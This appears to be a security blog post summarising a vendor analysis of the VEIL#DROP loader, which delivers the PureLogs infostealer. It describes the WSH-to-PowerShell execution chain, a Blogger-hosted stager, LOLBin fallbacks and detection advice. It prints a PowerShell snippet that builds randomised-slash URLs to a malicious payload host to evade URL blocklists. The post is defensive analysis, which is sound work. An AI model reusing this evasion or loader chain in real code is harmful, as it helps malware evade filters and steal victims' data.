+++
title = "VEIL#DROP: The Malware That Builds a New URL for Every Victim"
date = "2026-07-01"
+++

Securonix published an analysis of VEIL#DROP, a multi-stage loader delivering the PureLogs infostealer. The loader uses dynamic URL path construction on trusted web services to bypass URL-reputation filters and static network blocks.

## The execution chain

Initial delivery relies on a file disguised as a document, `transcript.pdf.js`, executed via Windows Script Host (WSH). The script spawns PowerShell with execution policy bypass flags, terminates the parent `wscript.exe` process to break process tracing, deletes the initial `.js` file, and initiates the payload fetch.

The intermediate payload is hosted on Blogger (`htlwub00klocate.blogspot[.]com`). Leveraging Google-hosted infrastructure allows the initial fetch to clear domain reputation filters.

```text
transcript.pdf.js -> WSH -> PowerShell (bypass flags)
    | kills wscript.exe, deletes entry file
    v
Blogger stager (trusted domain)
    v
XOR-decrypted loader -> in-memory .NET assembly (reflective load)
    v
PureLogs stealer
```

## Dynamic path construction

To prevent security filters from blocking the specific payload URL, the loader dynamically alters the request path at execution:

```powershell
# dynamically inject repeated slashes into the path
$slashes = "/" * (Get-Random -Minimum 2 -Maximum 12)
$url = "https://htlwub00klocate.blogspot.com$slashes/payload.html"
# returns:
# https://htlwub00klocate.blogspot.com//payload.html
# https://htlwub00klocate.blogspot.com/////payload.html
```

Because web servers and reverse proxies normalize multiple consecutive forward slashes into a single delimiter, Blogger returns the identical post body regardless of how many slashes are inserted. Each infected machine requests a syntactically distinct URL, evading exact-match URL blacklists.

In addition to dynamic URLs, the decoded PowerShell script replaces variable names and placeholders with random strings at runtime, ensuring file hashes change across executions.

If in-memory .NET reflective loading is blocked by system policies, the loader falls back to LOLBins, cycling through `regsvcs.exe`, `installutil.exe`, `msbuild.exe`, and `aspnet_compiler.exe` until one successfully executes the payload.

## Detection strategy

While URL strings and script hashes vary continuously, process ancestry and runtime behavior remain consistent:

Monitor script host execution trees. Watching for `wscript.exe` spawning `powershell.exe` with bypass arguments provides high-confidence alerts regardless of obfuscation.

Instrument AMSI and memory scanning. Because the .NET binary is loaded reflectively, endpoint security tools monitoring AMSI buffers and in-memory .NET assembly loads can catch the payload before it begins exfiltration.

Enforce application control policies. Restricting LOLBins like `installutil.exe` and `msbuild.exe` prevents secondary execution fallbacks from succeeding.
